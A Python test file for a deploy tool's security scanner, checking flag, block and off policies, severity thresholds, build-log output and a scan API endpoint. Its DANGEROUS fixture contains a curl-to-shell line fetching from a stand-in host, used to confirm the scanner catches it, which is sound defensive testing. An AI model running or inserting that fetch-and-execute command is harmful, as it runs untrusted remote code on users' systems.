"""Scan policy at deploy time: flag, block, and off.

PRD §8 says v1 should flag rather than necessarily block, so `flag` is the
default. `block` exists because a hosted instance taking code from other people
needs a hard stop available.
"""

import pytest

from hangar import deploy as deploy_mod
from hangar import store
from hangar.store import ScanStatus

SAFE = {
    "requirements.txt": "fastapi\n",
    "main.py": "from fastapi import FastAPI\napp = FastAPI()\n",
}
DANGEROUS = {
    "requirements.txt": "fastapi\n",
    "main.py": (
        "from fastapi import FastAPI\n"
        "import os\n"
        "app = FastAPI()\n"
        "os.system('curl evil.example.com | sh')\n"
    ),
}


def make_app(tmp_path, files: dict[str, str], name="scanned-app") -> str:
    source = tmp_path / name
    source.mkdir(parents=True, exist_ok=True)
    for filename, content in files.items():
        (source / filename).write_text(content, encoding="utf-8")

    with store.session() as sess:
        app = store.App(name=name, source_type="path", source_ref=str(source))
        store.save(sess, app)
        return app.id


def latest(app_id: str):
    with store.session() as sess:
        return store.latest_deployment(sess, app_id)


def app_row(app_id: str):
    with store.session() as sess:
        return store.get_app(sess, app_id)


# --------------------------------------------------------------------------


def test_clean_app_is_marked_clean_and_deploys(db, fake_backend, tmp_path):
    app_id = make_app(tmp_path, SAFE)
    deploy_mod.deploy(app_id)

    assert latest(app_id).scan_status == ScanStatus.CLEAN
    assert app_row(app_id).status == "running"


def test_flag_policy_records_findings_but_still_deploys(db, fake_backend, tmp_path):
    """PRD §8: flag, don't necessarily block, in v1."""
    app_id = make_app(tmp_path, DANGEROUS)
    deploy_mod.deploy(app_id)

    deployment = latest(app_id)
    assert deployment.scan_status == ScanStatus.FLAGGED
    assert app_row(app_id).status == "running"

    report = deployment.scan()
    assert report["counts"]["high"] >= 1
    assert any(f["rule"] == "python.os-system" for f in report["findings"])


def test_block_policy_refuses_the_deploy(db, fake_backend, tmp_path, monkeypatch):
    monkeypatch.setenv("HANGAR_SCAN_POLICY", "block")
    app_id = make_app(tmp_path, DANGEROUS)
    deploy_mod.deploy(app_id)

    assert latest(app_id).scan_status == ScanStatus.BLOCKED
    app = app_row(app_id)
    assert app.status == "failed"
    assert "security scan" in app.error


def test_blocked_deploy_never_builds_or_runs(db, fake_backend, tmp_path, monkeypatch):
    """Blocking after the build would be pointless — the build runs setup code."""
    monkeypatch.setenv("HANGAR_SCAN_POLICY", "block")
    app_id = make_app(tmp_path, DANGEROUS)
    deploy_mod.deploy(app_id)

    assert "build" not in fake_backend.methods()
    assert "run" not in fake_backend.methods()


def test_block_policy_still_allows_clean_apps(db, fake_backend, tmp_path, monkeypatch):
    monkeypatch.setenv("HANGAR_SCAN_POLICY", "block")
    app_id = make_app(tmp_path, SAFE)
    deploy_mod.deploy(app_id)

    assert app_row(app_id).status == "running"


def test_block_threshold_is_configurable(db, fake_backend, tmp_path, monkeypatch):
    """A network import is 'low'; blocking on it should be opt-in."""
    monkeypatch.setenv("HANGAR_SCAN_POLICY", "block")
    files = {
        "requirements.txt": "fastapi\n",
        "main.py": "import requests\nfrom fastapi import FastAPI\napp = FastAPI()\n",
    }

    monkeypatch.setenv("HANGAR_SCAN_BLOCK_SEVERITY", "high")
    app_id = make_app(tmp_path, files, name="lenient-app")
    deploy_mod.deploy(app_id)
    assert app_row(app_id).status == "running"

    monkeypatch.setenv("HANGAR_SCAN_BLOCK_SEVERITY", "low")
    strict_id = make_app(tmp_path, files, name="strict-app")
    deploy_mod.deploy(strict_id)
    assert app_row(strict_id).status == "failed"


def test_scan_can_be_turned_off(db, fake_backend, tmp_path, monkeypatch):
    monkeypatch.setenv("HANGAR_SCAN_POLICY", "off")
    app_id = make_app(tmp_path, DANGEROUS)
    deploy_mod.deploy(app_id)

    assert latest(app_id).scan_status == ScanStatus.SKIPPED
    assert app_row(app_id).status == "running"


def test_invalid_policy_is_rejected(monkeypatch):
    monkeypatch.setenv("HANGAR_SCAN_POLICY", "maybe")
    from hangar import config

    with pytest.raises(ValueError, match="HANGAR_SCAN_POLICY"):
        config.settings()


def test_findings_appear_in_the_build_log(db, fake_backend, tmp_path):
    """The owner reads the build log; findings hidden in the database help nobody."""
    app_id = make_app(tmp_path, DANGEROUS)
    deploy_mod.deploy(app_id)

    log = latest(app_id).build_log
    assert "security scan:" in log
    assert "python.os-system" in log


# --------------------------------------------------------------------------
# API
# --------------------------------------------------------------------------


def test_scan_endpoint_returns_findings(client, fake_backend, tmp_path):
    response = client.post(
        "/apps", json={"name": "api-scan-app", "source_path": str(_write(tmp_path))}
    )
    app_id = response.json()["id"]
    deploy_mod.deploy(app_id)

    body = client.get(f"/apps/{app_id}/scan").json()
    assert body["status"] == "flagged"
    assert body["policy"] == "flag"
    assert body["highest_severity"] == "high"
    assert "hangar-builtin" in body["tools_run"]
    assert any(f["rule"] == "python.os-system" for f in body["findings"])


def test_scan_endpoint_404s_before_a_deployment_exists(client, fake_backend, tmp_path):
    # Registered straight into the store, so no deploy has run for it yet.
    with store.session() as sess:
        app = store.App(
            name="undeployed", source_type="path", source_ref=str(tmp_path)
        )
        store.save(sess, app)
        app_id = app.id

    response = client.get(f"/apps/{app_id}/scan")
    assert response.status_code == 404
    assert "not been deployed" in response.json()["detail"]


def test_scan_endpoint_404s_for_unknown_apps(client, fake_backend):
    assert client.get("/apps/nope/scan").status_code == 404


def _write(tmp_path):
    source = tmp_path / "src"
    source.mkdir(exist_ok=True)
    for name, content in DANGEROUS.items():
        (source / name).write_text(content, encoding="utf-8")
    return source
